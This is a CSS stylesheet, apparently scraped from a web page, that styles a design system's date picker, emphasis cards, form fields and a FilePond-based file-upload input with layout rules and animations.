.stamp-date-picker__date--today:disabled { background-color: var(--stamp-color-background-date-input-today-disabled); }

.stamp-date-picker__date:disabled, .stamp-date-picker__date--disabled { cursor: not-allowed; color: var(--stamp-color-text-date-input-date-disabled); background-color: var(--stamp-color-background-date-input-date-disabled); }

.stamp-date-picker__date--prev-month, .stamp-date-picker__date--next-month { color: var(--stamp-color-text-date-input-date-subtle); }

.stamp-date-picker__date--prev-month:not(:disabled):hover, .stamp-date-picker__date--next-month:not(:disabled):hover { color: var(--stamp-color-text-date-input-date-subtle); border-color: var(--stamp-color-border-default); }

.stamp-date-picker__week-list { display: flex; flex-direction: column; justify-content: space-around; color: var(--stamp-color-heading-subtle); }

.stamp-date-picker__week { inline-size: var(--stamp-spacing-inner-xl); font-family: var(--stamp-text-heading-xxs-font-family), sans-serif; font-weight: var(--stamp-text-heading-xxs-font-weight); line-height: var(--stamp-text-heading-xxs-line-height); font-size: var(--stamp-text-heading-xxs-font-size); letter-spacing: var(--stamp-text-heading-xxs-letter-spacing); }

.stamp-date-picker__calendar { display: flex; }

.stamp-emphasis-card { display: flex; flex-direction: column; row-gap: var(--stamp-spacing-inner-xl); max-inline-size: 375px; padding-block: var(--stamp-spacing-outer-s); block-size: 100%; }

.stamp-emphasis-card__content { display: flex; flex-direction: column; }

.stamp-emphasis-card__image { overflow: hidden; grid-area: 1 / 1; }

.stamp-emphasis-card__image .stamp-image, .stamp-emphasis-card__image img { min-block-size: 240px; block-size: 100%; object-fit: cover; }

.stamp-emphasis-card__header + .stamp-emphasis-card__body, .stamp-emphasis-card__header + .stamp-emphasis-card__footer { margin-block-start: var(--stamp-spacing-inner-l); }

.stamp-emphasis-card__body + .stamp-emphasis-card__footer { margin-block-start: var(--stamp-spacing-inner-xxl); }

.stamp-emphasis-card__footer { display: flex; flex-flow: wrap; align-items: center; gap: var(--stamp-spacing-inner-xl); }

@media (min-width: 768px) {
  .stamp-emphasis-card--size-full { display: grid; grid-template-columns: 340px 1fr; column-gap: var(--stamp-spacing-inner-3-xl); max-inline-size: unset; }
  .stamp-emphasis-card--size-full.stamp-emphasis-card__image { block-size: 100%; }
  .stamp-emphasis-card--size-full.stamp-emphasis-card--image-end { grid-template-columns: 1fr 340px; }
  .stamp-emphasis-card--size-full.stamp-emphasis-card--image-end .stamp-emphasis-card__image { grid-column: 2; }
  .stamp-emphasis-card--size-full .stamp-emphasis-card__footer { display: flex; flex-direction: row; gap: var(--stamp-spacing-inner-xxl); }
}

.filepond--assistant { position: absolute; overflow: hidden; height: 1px; width: 1px; padding: 0px; border: 0px; clip: rect(1px, 1px, 1px, 1px); clip-path: inset(50%); white-space: nowrap; }

.filepond--browser.filepond--browser { position: absolute; margin: 0px; padding: 0px; left: 1em; top: 1.75em; width: calc(100% - 2em); opacity: 0; font-size: 0px; }

.filepond--data { position: absolute; width: 0px; height: 0px; padding: 0px; margin: 0px; border: medium; visibility: hidden; pointer-events: none; contain: strict; }

.filepond--drip { position: absolute; inset: 0px; overflow: hidden; opacity: 0.1; pointer-events: none; border-radius: 0.5em; background: rgba(0, 0, 0, 0.01); }

.filepond--drip-blob { transform-origin: center center 0px; width: 8em; height: 8em; margin-left: -4em; margin-top: -4em; background: rgb(41, 38, 37); border-radius: 50%; }

.filepond--drip-blob, .filepond--drop-label { position: absolute; top: 0px; left: 0px; will-change: transform, opacity; }

.filepond--drop-label { right: 0px; margin: 0px; color: rgb(79, 79, 79); display: flex; justify-content: center; align-items: center; height: 0px; user-select: none; }

.filepond--drop-label.filepond--drop-label label { display: block; margin: 0px; padding: 0.5em; }

.filepond--drop-label label { cursor: default; font-size: 0.875em; font-weight: 400; text-align: center; line-height: 1.5; }

.filepond--label-action { text-decoration: underline rgb(167, 164, 164); text-decoration-skip-ink: auto; cursor: pointer; }

.filepond--root[data-disabled] .filepond--drop-label label { opacity: 0.5; }

.filepond--file-action-button.filepond--file-action-button { font-size: 1em; width: 1.625em; height: 1.625em; font-family: inherit; line-height: inherit; margin: 0px; padding: 0px; border: medium; outline: none; will-change: transform, opacity; }

.filepond--file-action-button.filepond--file-action-button span { position: absolute; overflow: hidden; height: 1px; width: 1px; padding: 0px; border: 0px; clip: rect(1px, 1px, 1px, 1px); clip-path: inset(50%); white-space: nowrap; }

.filepond--file-action-button.filepond--file-action-button svg { width: 100%; height: 100%; }

.filepond--file-action-button.filepond--file-action-button::after { position: absolute; inset: -0.75em; content: &quot;&quot;; }

.filepond--file-action-button { cursor: auto; color: rgb(255, 255, 255); border-radius: 50%; background-color: rgba(0, 0, 0, 0.5); background-image: none; box-shadow: rgba(255, 255, 255, 0) 0px 0px 0px 0px; transition: box-shadow 0.25s ease-in; }

.filepond--file-action-button:focus, .filepond--file-action-button:hover { box-shadow: rgba(255, 255, 255, 0.9) 0px 0px 0px 0.125em; }

.filepond--file-action-button[disabled] { color: rgba(255, 255, 255, 0.5); background-color: rgba(0, 0, 0, 0.25); }

.filepond--file-action-button[hidden] { display: none; }

.filepond--action-edit-item.filepond--action-edit-item { width: 2em; height: 2em; padding: 0.1875em; }

.filepond--action-edit-item.filepond--action-edit-item[data-align*=&quot;center&quot;] { margin-left: -0.1875em; }

.filepond--action-edit-item.filepond--action-edit-item[data-align*=&quot;bottom&quot;] { margin-bottom: -0.1875em; }

.filepond--action-edit-item-alt { border: medium; line-height: inherit; background: transparent; font-family: inherit; color: inherit; outline: none; padding: 0px; margin: 0px 0px 0px 0.25em; pointer-events: all; position: absolute; }

.filepond--action-edit-item-alt svg { width: 1.3125em; height: 1.3125em; }

.filepond--action-edit-item-alt span { font-size: 0px; opacity: 0; }

.filepond--file-info { position: static; display: flex; flex-direction: column; align-items: flex-start; flex: 1 1 0%; margin: 0px 0.5em 0px 0px; min-width: 0px; will-change: transform, opacity; pointer-events: none; user-select: none; }

.filepond--file-info * { margin: 0px; }

.filepond--file-info .filepond--file-info-main { font-size: 0.75em; line-height: 1.2; text-overflow: ellipsis; overflow: hidden; white-space: nowrap; width: 100%; }

.filepond--file-info .filepond--file-info-sub { font-size: 0.625em; opacity: 0.5; transition: opacity 0.25s ease-in-out; white-space: nowrap; }

.filepond--file-info .filepond--file-info-sub:empty { display: none; }

.filepond--file-status { position: static; display: flex; flex-direction: column; align-items: flex-end; flex-grow: 0; flex-shrink: 0; margin: 0px; min-width: 2.25em; text-align: right; will-change: transform, opacity; pointer-events: none; user-select: none; }

.filepond--file-status * { margin: 0px; white-space: nowrap; }

.filepond--file-status .filepond--file-status-main { font-size: 0.75em; line-height: 1.2; }

.filepond--file-status .filepond--file-status-sub { font-size: 0.625em; opacity: 0.5; transition: opacity 0.25s ease-in-out; }

.filepond--file-wrapper.filepond--file-wrapper { border: medium; margin: 0px; padding: 0px; min-width: 0px; height: 100%; }

.filepond--file-wrapper.filepond--file-wrapper > legend { position: absolute; overflow: hidden; height: 1px; width: 1px; padding: 0px; border: 0px; clip: rect(1px, 1px, 1px, 1px); clip-path: inset(50%); white-space: nowrap; }

.filepond--file { position: static; display: flex; height: 100%; align-items: flex-start; padding: 0.5625em; color: rgb(255, 255, 255); border-radius: 0.5em; }

.filepond--file .filepond--file-status { margin-left: auto; margin-right: 2.25em; }

.filepond--file .filepond--processing-complete-indicator { pointer-events: none; user-select: none; z-index: 3; }

.filepond--file .filepond--file-action-button, .filepond--file .filepond--processing-complete-indicator, .filepond--file .filepond--progress-indicator { position: absolute; }

.filepond--file [data-align*=&quot;left&quot;] { left: 0.5625em; }

.filepond--file [data-align*=&quot;right&quot;] { right: 0.5625em; }

.filepond--file [data-align*=&quot;center&quot;] { left: calc(50% - 0.8125em); }

.filepond--file [data-align*=&quot;bottom&quot;] { bottom: 1.125em; }

.filepond--file [data-align=&quot;center&quot;] { top: calc(50% - 0.8125em); }

.filepond--file .filepond--progress-indicator { margin-top: 0.1875em; }

.filepond--file .filepond--progress-indicator[data-align*=&quot;right&quot;] { margin-right: 0.1875em; }

.filepond--file .filepond--progress-indicator[data-align*=&quot;left&quot;] { margin-left: 0.1875em; }

[data-filepond-item-state*=&quot;error&quot;] .filepond--file-info, [data-filepond-item-state*=&quot;invalid&quot;] .filepond--file-info, [data-filepond-item-state=&quot;cancelled&quot;] .filepond--file-info { margin-right: 2.25em; }

[data-filepond-item-state~=&quot;processing&quot;] .filepond--file-status-sub { opacity: 0; }

[data-filepond-item-state~=&quot;processing&quot;] .filepond--action-abort-item-processing ~ .filepond--file-status .filepond--file-status-sub { opacity: 0.5; }

[data-filepond-item-state=&quot;processing-error&quot;] .filepond--file-status-sub { opacity: 0; }

[data-filepond-item-state=&quot;processing-error&quot;] .filepond--action-retry-item-processing ~ .filepond--file-status .filepond--file-status-sub { opacity: 0.5; }

[data-filepond-item-state=&quot;processing-complete&quot;] .filepond--action-revert-item-processing svg { animation: 0.5s linear 0.125s both fall; }

[data-filepond-item-state=&quot;processing-complete&quot;] .filepond--file-status-sub { opacity: 0.5; }

[data-filepond-item-state=&quot;processing-complete&quot;] .filepond--file-info-sub, [data-filepond-item-state=&quot;processing-complete&quot;] .filepond--processing-complete-indicator:not([style*=&quot;hidden&quot;]) ~ .filepond--file-status .filepond--file-status-sub { opacity: 0; }

[data-filepond-item-state=&quot;processing-complete&quot;] .filepond--action-revert-item-processing ~ .filepond--file-info .filepond--file-info-sub { opacity: 0.5; }

[data-filepond-item-state*=&quot;error&quot;] .filepond--file-wrapper, [data-filepond-item-state*=&quot;error&quot;] .filepond--panel, [data-filepond-item-state*=&quot;invalid&quot;] .filepond--file-wrapper, [data-filepond-item-state*=&quot;invalid&quot;] .filepond--panel { animation: 0.65s linear both shake; }

[data-filepond-item-state*=&quot;busy&quot;] .filepond--progress-indicator svg { animation: 1s linear infinite spin; }

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(1turn); }
}

@keyframes shake {
  10%, 90% { transform: translateX(-0.0625em); }
  20%, 80% { transform: translateX(0.125em); }
  30%, 50%, 70% { transform: translateX(-0.25em); }
  40%, 60% { transform: translateX(0.25em); }
}

@keyframes fall {
  0% { opacity: 0; transform: scale(0.5); animation-timing-function: ease-out; }
  70% { opacity: 1; transform: scale(1.1); animation-timing-function: ease-in-out; }
  100% { transform: scale(1); animation-timing-function: ease-out; }
}

.filepond--hopper[data-hopper-state=&quot;drag-over&quot;] > * { pointer-events: none; }

.filepond--hopper[data-hopper-state=&quot;drag-over&quot;]::after { content: &quot;&quot;; position: absolute; inset: 0px; z-index: 100; }

.filepond--progress-indicator { z-index: 103; }

.filepond--file-action-button { z-index: 102; }

.filepond--file-status { z-index: 101; }

.filepond--file-info { z-index: 100; }

.filepond--item { position: absolute; top: 0px; left: 0px; right: 0px; z-index: 1; padding: 0px; margin: 0.25em; will-change: transform, opacity; }

.filepond--item > .filepond--panel { z-index: -1; }

.filepond--item > .filepond--panel .filepond--panel-bottom { box-shadow: rgba(0, 0, 0, 0.25) 0px 0.0625em 0.125em -0.0625em; }

.filepond--item > .filepond--file-wrapper, .filepond--item > .filepond--panel { transition: opacity 0.15s ease-out; }

.filepond--item[data-drag-state] { cursor: grab; }

.filepond--item[data-drag-state] > .filepond--panel { transition: box-shadow 0.125s ease-in-out; box-shadow: transparent 0px 0px 0px; }

.filepond--item[data-drag-state=&quot;drag&quot;] { cursor: grabbing; }

.filepond--item[data-drag-state=&quot;drag&quot;] > .filepond--panel { box-shadow: rgba(0, 0, 0, 0.325) 0px 0.125em 0.3125em; }

.filepond--item[data-drag-state]:not([data-drag-state=&quot;idle&quot;]) { z-index: 2; }

.filepond--item-panel { background-color: rgb(100, 96, 94); }

[data-filepond-item-state=&quot;processing-complete&quot;] .filepond--item-panel { background-color: rgb(54, 151, 99); }

[data-filepond-item-state*=&quot;error&quot;] .filepond--item-panel, [data-filepond-item-state*=&quot;invalid&quot;] .filepond--item-panel { background-color: rgb(196, 78, 71); }

.filepond--item-panel { border-radius: 0.5em; transition: background-color 0.25s; }

.filepond--list-scroller { position: absolute; top: 0px; left: 0px; right: 0px; margin: 0px; will-change: transform; }

.filepond--list-scroller[data-state=&quot;overflow&quot;] .filepond--list { bottom: 0px; right: 0px; }

.filepond--list-scroller[data-state=&quot;overflow&quot;] { overflow: hidden scroll; mask: linear-gradient(rgb(0, 0, 0) calc(100% - 0.5em), transparent); }

.filepond--list-scroller::-webkit-scrollbar { background: transparent; }

.filepond--list-scroller::-webkit-scrollbar-thumb { background-color: rgba(0, 0, 0, 0.3); border-radius: 99999px; border: 0.3125em solid transparent; background-clip: content-box; }

.filepond--list.filepond--list { position: absolute; top: 0px; margin: 0px; padding: 0px; list-style-type: none; will-change: transform; }

.filepond--list { left: 0.75em; right: 0.75em; }

.filepond--root[data-style-panel-layout~=&quot;integrated&quot;] { width: 100%; height: 100%; max-width: none; margin: 0px; }

.filepond--root[data-style-panel-layout~=&quot;circle&quot;] .filepond--panel-root, .filepond--root[data-style-panel-layout~=&quot;integrated&quot;] .filepond--panel-root { border-radius: 0px; }

.filepond--root[data-style-panel-layout~=&quot;circle&quot;] .filepond--panel-root > *, .filepond--root[data-style-panel-layout~=&quot;integrated&quot;] .filepond--panel-root > * { display: none; }

.filepond--root[data-style-panel-layout~=&quot;circle&quot;] .filepond--drop-label, .filepond--root[data-style-panel-layout~=&quot;integrated&quot;] .filepond--drop-label { bottom: 0px; height: auto; display: flex; justify-content: center; align-items: center; z-index: 7; }

.filepond--root[data-style-panel-layout~=&quot;circle&quot;] .filepond--item-panel, .filepond--root[data-style-panel-layout~=&quot;integrated&quot;] .filepond--item-panel { display: none; }

.filepond--root[data-style-panel-layout~=&quot;compact&quot;] .filepond--list-scroller, .filepond--root[data-style-panel-layout~=&quot;integrated&quot;] .filepond--list-scroller { overflow: hidden; height: 100%; margin-top: 0px; margin-bottom: 0px; }

.filepond--root[data-style-panel-layout~=&quot;compact&quot;] .filepond--list, .filepond--root[data-style-panel-layout~=&quot;integrated&quot;] .filepond--list { left: 0px; right: 0px; height: 100%; }

.filepond--root[data-style-panel-layout~=&quot;compact&quot;] .filepond--item, .filepond--root[data-style-panel-layout~=&quot;integrated&quot;] .filepond--item { margin: 0px; }

.filepond--root[data-style-panel-layout~=&quot;compact&quot;] .filepond--file-wrapper, .filepond--root[data-style-panel-layout~=&quot;integrated&quot;] .filepond--file-wrapper { height: 100%; }

.filepond--root[data-style-panel-layout~=&quot;compact&quot;] .filepond--drop-label, .filepond--root[data-style-panel-layout~=&quot;integrated&quot;] .filepond--drop-label { z-index: 7; }

.filepond--root[data-style-panel-layout~=&quot;circle&quot;] { border-radius: 99999rem; overflow: hidden; }

.filepond--root[data-style-panel-layout~=&quot;circle&quot;] > .filepond--panel { border-radius: inherit; }

.filepond--root[data-style-panel-layout~=&quot;circle&quot;] > .filepond--panel > * { display: none; }

.filepond--root[data-style-panel-layout~=&quot;circle&quot;] .filepond--file-info, .filepond--root[data-style-panel-layout~=&quot;circle&quot;] .filepond--file-status { display: none; }

.filepond--root[data-style-panel-layout~=&quot;circle&quot;] .filepond--action-edit-item { opacity: 1 !important; visibility: visible !important; }

@media not all and (-webkit-min-device-pixel-ratio: 0), not all and (min-resolution: 0.001dpcm) {
  @supports (-webkit-appearance:none) and (stroke-color:transparent) {
    .filepond--root[data-style-panel-layout~=&quot;circle&quot;] { will-change: transform; }
  }
}

.filepond--panel-root { border-radius: 0.5em; background-color: rgb(241, 240, 239); }

.filepond--panel { position: absolute; left: 0px; top: 0px; right: 0px; margin: 0px; height: 100% !important; pointer-events: none; }

.filepond-panel:not([data-scalable=&quot;false&quot;]) { height: auto !important; }

.filepond--panel[data-scalable=&quot;false&quot;] > div { display: none; }

.filepond--panel[data-scalable=&quot;true&quot;] { transform-style: preserve-3d; background-color: transparent !important; border: medium !important; }

.filepond--panel-bottom, .filepond--panel-center, .filepond--panel-top { position: absolute; left: 0px; top: 0px; right: 0px; margin: 0px; padding: 0px; }

.filepond--panel-bottom, .filepond--panel-top { height: 0.5em; }

.filepond--panel-top { border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-bottom: medium !important; }

.filepond--panel-top::after { content: &quot;&quot;; position: absolute; height: 2px; left: 0px; right: 0px; bottom: -1px; background-color: inherit; }

.filepond--panel-bottom, .filepond--panel-center { will-change: transform; backface-visibility: hidden; transform-origin: left top 0px; transform: translate3d(0px, 0.5em, 0px); }

.filepond--panel-bottom { border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border-top: medium !important; }

.filepond--panel-bottom::before { content: &quot;&quot;; position: absolute; height: 2px; left: 0px; right: 0px; top: -1px; background-color: inherit; }

.filepond--panel-center { height: 100px !important; border-top: medium !important; border-bottom: medium !important; border-radius: 0px !important; }

.filepond--panel-center:not([style]) { visibility: hidden; }

.filepond--progress-indicator { position: static; width: 1.25em; height: 1.25em; color: rgb(255, 255, 255); margin: 0px; pointer-events: none; will-change: transform, opacity; }

.filepond--progress-indicator svg { width: 100%; height: 100%; vertical-align: top; transform-box: fill-box; }

.filepond--progress-indicator path { fill: none; stroke: currentcolor; }

.filepond--list-scroller { z-index: 6; }

.filepond--drop-label { z-index: 5; }

.filepond--drip { z-index: 3; }

.filepond--root > .filepond--panel { z-index: 2; }

.filepond--browser { z-index: 1; }

.filepond--root { box-sizing: border-box; position: relative; margin-bottom: 1em; font-size: 1rem; line-height: normal; font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica, Arial, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol; font-weight: 450; text-align: left; text-rendering: optimizelegibility; direction: ltr; contain: size layout style; }

.filepond--root * { box-sizing: inherit; line-height: inherit; }

.filepond--root :not(text) { font-size: inherit; }

.filepond--root[data-disabled] { pointer-events: none; }

.filepond--root[data-disabled] .filepond--list-scroller { pointer-events: all; }

.filepond--root[data-disabled] .filepond--list { pointer-events: none; }

.filepond--root .filepond--drop-label { min-height: 4.75em; }

.filepond--root .filepond--list-scroller { margin-top: 1em; margin-bottom: 1em; }

.filepond--root .filepond--credits { position: absolute; right: 0px; opacity: 0.175; line-height: 0.85; font-size: 11px; color: inherit; text-decoration: none; z-index: 3; bottom: -14px; }

.filepond--root .filepond--credits[style] { top: 0px; bottom: auto; margin-top: 14px; }

.filepond--image-preview-markup { position: absolute; left: 0px; top: 0px; }

.filepond--image-preview-wrapper { z-index: 2; }

.filepond--image-preview-overlay { display: block; position: absolute; left: 0px; top: 0px; width: 100%; min-height: 5rem; max-height: 7rem; margin: 0px; opacity: 0; z-index: 2; pointer-events: none; user-select: none; }

.filepond--image-preview-overlay svg { width: 100%; height: auto; color: inherit; max-height: inherit; }

.filepond--image-preview-overlay-idle { mix-blend-mode: multiply; color: rgba(40, 40, 40, 0.85); }

.filepond--image-preview-overlay-success { mix-blend-mode: normal; color: rgb(54, 151, 99); }

.filepond--image-preview-overlay-failure { mix-blend-mode: normal; color: rgb(196, 78, 71); }

@supports (-webkit-marquee-repetition: infinite) and ((-o-object-fit: fill) or (object-fit: fill)) {
  .filepond--image-preview-overlay-idle { mix-blend-mode: normal; }
}

.filepond--image-preview-wrapper { user-select: none; position: absolute; left: 0px; top: 0px; right: 0px; height: 100%; margin: 0px; border-radius: 0.45em; overflow: hidden; background: rgba(0, 0, 0, 0.01); }

.filepond--image-preview { position: absolute; left: 0px; top: 0px; z-index: 1; display: flex; align-items: center; height: 100%; width: 100%; pointer-events: none; background: rgb(34, 34, 34); will-change: transform, opacity; }

.filepond--image-clip { position: relative; overflow: hidden; margin: 0px auto; }

.filepond--image-clip[data-transparency-indicator=&quot;grid&quot;] img, .filepond--image-clip[data-transparency-indicator=&quot;grid&quot;] canvas { background-color: rgb(255, 255, 255); background-image: url(&quot;&quot;); background-size: 1.25em 1.25em; }

.filepond--image-bitmap, .filepond--image-vector { position: absolute; left: 0px; top: 0px; will-change: transform; }

.filepond--root[data-style-panel-layout~=&quot;integrated&quot;] .filepond--image-preview-wrapper { border-radius: 0px; }

.filepond--root[data-style-panel-layout~=&quot;integrated&quot;] .filepond--image-preview { height: 100%; display: flex; justify-content: center; align-items: center; }

.filepond--root[data-style-panel-layout~=&quot;circle&quot;] .filepond--image-preview-wrapper { border-radius: 99999rem; }

.filepond--root[data-style-panel-layout~=&quot;circle&quot;] .filepond--image-preview-overlay { top: auto; bottom: 0px; transform: scaleY(-1); }

.filepond--root[data-style-panel-layout~=&quot;circle&quot;] .filepond--file .filepond--file-action-button[data-align*=&quot;bottom&quot;]:not([data-align*=&quot;center&quot;]) { margin-bottom: 0.325em; }

.filepond--root[data-style-panel-layout~=&quot;circle&quot;] .filepond--file [data-align*=&quot;left&quot;] { left: calc(50% - 3em); }

.filepond--root[data-style-panel-layout~=&quot;circle&quot;] .filepond--file [data-align*=&quot;right&quot;] { right: calc(50% - 3em); }

.filepond--root[data-style-panel-layout~=&quot;circle&quot;] .filepond--progress-indicator[data-align*=&quot;bottom&quot;][data-align*=&quot;left&quot;], .filepond--root[data-style-panel-layout~=&quot;circle&quot;] .filepond--progress-indicator[data-align*=&quot;bottom&quot;][data-align*=&quot;right&quot;] { margin-bottom: calc(0.5125em); }

.filepond--root[data-style-panel-layout~=&quot;circle&quot;] .filepond--progress-indicator[data-align*=&quot;bottom&quot;][data-align*=&quot;center&quot;] { margin-top: 0px; margin-bottom: 0.1875em; margin-left: 0.1875em; }

.stamp-file-input--size-narrow { inline-size: 50%; }

.stamp-file-input--size-full { inline-size: 100%; }

@media (min-width: 481px) {
  .stamp-file-input { inline-size: 50%; }
  .stamp-file-input--size-narrow { inline-size: 25%; }
  .stamp-file-input--size-full { inline-size: 100%; }
}

.stamp-file-input.filepond--root { font-family: var(--stamp-text-heading-s-font-family); font-weight: var(--stamp-text-body-s-default-font-weight); font-size: var(--stamp-text-body-s-default-font-size); line-height: var(--stamp-text-body-s-default-line-height); background: var(--stamp-color-background-surface); border-radius: var(--stamp-radius-s); border-width: var(--stamp-border-width-s); border-style: dashed; border-color: var(--stamp-color-border-button-secondary-default); }

.stamp-file-input.filepond--root:has([data-filepond-item-state*=&quot;error&quot;]) { border-color: var(--stamp-color-border-error); }

.stamp-file-input .filepond--list { margin-inline: 12px !important; }

.stamp-file-input.filepond--root .filepond--list-scroller { margin-block-end: 24px !important; }

.stamp-file-input .filepond--file { block-size: 56px !important; }

.stamp-file-input .filepond--panel-root { background: none; }

.stamp-file-input.filepond--root:focus-within { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 2px; border-radius: var(--stamp-border-width-m); }

.stamp-file-input .filepond--drop-label { display: flex; padding: var(--stamp-spacing-inner-xl); position: inherit !important; block-size: auto; color: var(--stamp-color-text-subtle); }

.stamp-file-input .filepond--drop-label label { display: flex !important; flex-direction: column; font-family: var(--stamp-text-body-s-default-font-family), sans-serif; font-weight: var(--stamp-text-body-s-default-font-weight); font-size: var(--stamp-text-body-s-default-font-size); line-height: var(--stamp-text-body-s-default-line-height); letter-spacing: var(--stamp-text-body-s-default-letter-spacing); }

.stamp-file-input__label { flex-grow: 0; align-self: center; justify-content: center; display: flex; flex-direction: row; gap: var(--stamp-spacing-inner-s); margin-bottom: var(--stamp-spacing-inner-s); background: var(--stamp-color-background-button-secondary-default); color: var(--stamp-color-text-button-secondary-default); padding-block: var(--stamp-spacing-inner-s); padding-inline: var(--stamp-spacing-inner-xl); border-style: solid; border-radius: var(--stamp-radius-xs); border-width: var(--stamp-border-width-s); font-family: var(--stamp-text-cta-default-font-family), sans-serif; font-weight: var(--stamp-text-cta-default-font-weight); line-height: var(--stamp-text-cta-default-line-height); font-size: var(--stamp-text-cta-default-font-size); letter-spacing: var(--stamp-text-cta-default-letter-spacing); text-decoration: none; }

.stamp-file-input .filepond--drop-label span:focus { outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; outline-color: var(--stamp-color-border-focus-outline); }

.stamp-file-input .filepond--label-action { text-decoration: none; }

.stamp-file-input .filepond--label-action:hover { text-decoration: underline; }

.stamp-file-input .filepond--label-action:focus-within { outline-style: none !important; }

.stamp-file-input .filepond--action-retry-item-processing { display: none !important; }

.stamp-file-input .filepond--file { display: flex; align-items: center; color: var(--stamp-color-text-default); padding: var(--stamp-spacing-inner-s) var(--stamp-spacing-inner-m); border-radius: var(--stamp-radius-m); background-color: var(--stamp-color-background-variant); }

.stamp-file-input .filepond--file:focus { outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; outline-color: var(--stamp-color-border-focus-outline); }

.stamp-file-input .filepond--file-info { position: relative !important; left: 44px !important; margin-inline-end: 44px !important; block-size: 100% !important; transform: none !important; z-index: 0; }

.stamp-file-input .filepond--file-info::before { content: url(&quot;&quot;); position: absolute; background: transparent; width: 32px; height: 32px; left: -44px; top: 5px; z-index: 0; }

.stamp-file-input .filepond--file-info-main { color: var(--stamp-color-heading-subtle); font-family: var(--stamp-text-heading-xxs-font-family), sans-serif  !important; font-weight: var(--stamp-text-heading-xxs-font-weight)  !important; line-height: var(--stamp-text-heading-xxs-line-height)  !important; font-size: var(--stamp-text-heading-xxs-font-size)  !important; letter-spacing: var(--stamp-text-heading-xxs-letter-spacing)  !important; padding-right: 30px; }

.stamp-file-input .filepond--file-info-sub { position: absolute !important; bottom: 0px !important; opacity: 1 !important; }

.stamp-file-input .filepond--file-info-sub, .stamp-file-input .filepond--file-status-main { font-family: var(--stamp-text-body-s-default-font-family), sans-serif  !important; font-weight: var(--stamp-text-body-s-default-font-weight)  !important; line-height: var(--stamp-text-body-s-default-line-height)  !important; font-size: var(--stamp-text-body-s-default-font-size)  !important; letter-spacing: var(--stamp-text-body-s-default-letter-spacing)  !important; }

.stamp-file-input .filepond--drip { opacity: 1; background: none !important; }

.stamp-file-input .filepond--drip-blob { background-color: var(--stamp-color-background-variant); }

.stamp-file-input .filepond--file-status { transform: none !important; height: 100% !important; position: absolute !important; left: 0px !important; margin-left: 108px !important; }

.stamp-file-input .filepond--file-status-main { margin-top: 25.5px !important; }

.stamp-file-input .filepond--file-status .filepond--file-status-sub { display: none; }

.stamp-file-input .filepond--file-action-button:focus { outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; outline-color: var(--stamp-color-border-focus-outline); }

.stamp-file-input .filepond--action-remove-item, .stamp-file-input .filepond--action-revert-item-processing { background-color: var(--stamp-color-text-icon-button-default)  !important; }

.stamp-file-input .filepond--item { block-size: 56px !important; }

.stamp-file-input .filepond--file-wrapper { background-color: white; }

.stamp-file-input .filepond--item-panel, .stamp-file-input .filepond--item-panel > * { box-shadow: none; background: none; }

.stamp-file-input [data-filepond-item-state*=&quot;error&quot;] .filepond--item-panel, .stamp-file-input [data-filepond-item-state*=&quot;invalid&quot;] .filepond--item-panel { background: none !important; }

.stamp-file-input [data-filepond-item-state*=&quot;error&quot;] .filepond--file, .stamp-file-input [data-filepond-item-state*=&quot;invalid&quot;] .filepond--file { background-color: var(--stamp-color-background-negative)  !important; }

.stamp-file-input [data-filepond-item-state*=&quot;error&quot;] .filepond--file-status-main, .stamp-file-input [data-filepond-item-state*=&quot;invalid&quot;] .filepond--file-status-main { display: flex; align-items: center; color: var(--stamp-color-text-negative); font-family: var(--stamp-text-form-feedback-font-family), sans-serif  !important; font-weight: var(--stamp-text-form-feedback-font-weight)  !important; line-height: var(--stamp-text-form-feedback-line-height)  !important; font-size: var(--stamp-text-form-feedback-font-size)  !important; letter-spacing: var(--stamp-text-form-feedback-letter-spacing)  !important; margin-left: -54px !important; }

.stamp-file-input [data-filepond-item-state*=&quot;error&quot;] .filepond--file-info-sub, .stamp-file-input [data-filepond-item-state*=&quot;invalid&quot;] .filepond--file-info-sub { display: none; }

.stamp-file-input [data-filepond-item-state*=&quot;error&quot;] .filepond--file-status-main::before, .stamp-file-input [data-filepond-item-state*=&quot;invalid&quot;] .filepond--file-status-main::before { display: block; block-size: 24px; margin-inline-end: 4px; content: url(&quot;&quot;) !important; }

.stamp-file-input .filepond--image-clip { margin: 0px !important; }

.stamp-file-input .filepond--image-preview-overlay { display: none !important; }

.stamp-file-input .filepond--image-preview-wrapper { height: 32px !important; width: 32px !important; left: 12px !important; top: 12px !important; border-radius: 0px; background-color: var(--stamp-color-background-variant); position: absolute; }

.stamp-file-input .filepond--image-preview { display: flex; justify-content: center; align-items: center; background: none !important; }

.stamp-file-input .filepond--file-action-button { right: 15px !important; border-radius: var(--stamp-radius-xs); background: var(--stamp-color-background-icon-button-primary-default)  !important; }

.stamp-file-input .filepond--file .filepond--progress-indicator { top: 0px !important; right: 0px !important; margin-top: 18px !important; margin-right: 18px !important; }

.stamp-file-input .filepond--panel-top, .stamp-file-input .filepond--panel-center, .stamp-file-input .filepond--panel-bottom { display: none; }

.stamp-file-input .filepond--image-canvas-wrapper { transform: none !important; }

.stamp-file-input .filepond--image-bitmap canvas { max-height: 32px !important; width: 100% !important; }

.stamp-form-field { display: flex; flex-direction: column; gap: var(--stamp-spacing-inner-s); }

.stamp-form-field--direction-row { display: grid; grid-template: &quot;input label&quot; &quot;input helper-text&quot; &quot;error error&quot; / 24px auto; column-gap: var(--stamp-spacing-inner-s); row-gap: var(--stamp-spacing-inner-xs); }

.stamp-form-field--direction-column { justify-content: flex-start; }

.stamp-form-field-error { grid-area: error; display: flex; gap: var(--stamp-spacing-inner-s); color: var(--stamp-color-text-negative); margin-inline-start: -3px; font-family: var(--stamp-text-form-feedback-font-family), sans-serif; font-weight: var(--stamp-text-form-feedback-font-weight); line-height: var(--stamp-text-form-feedback-line-height); font-size: var(--stamp-text-form-feedback-font-size); letter-spacing: var(--stamp-text-form-feedback-letter-spacing); }

.stamp-form-field-error__text { margin-block-start: 2px; }

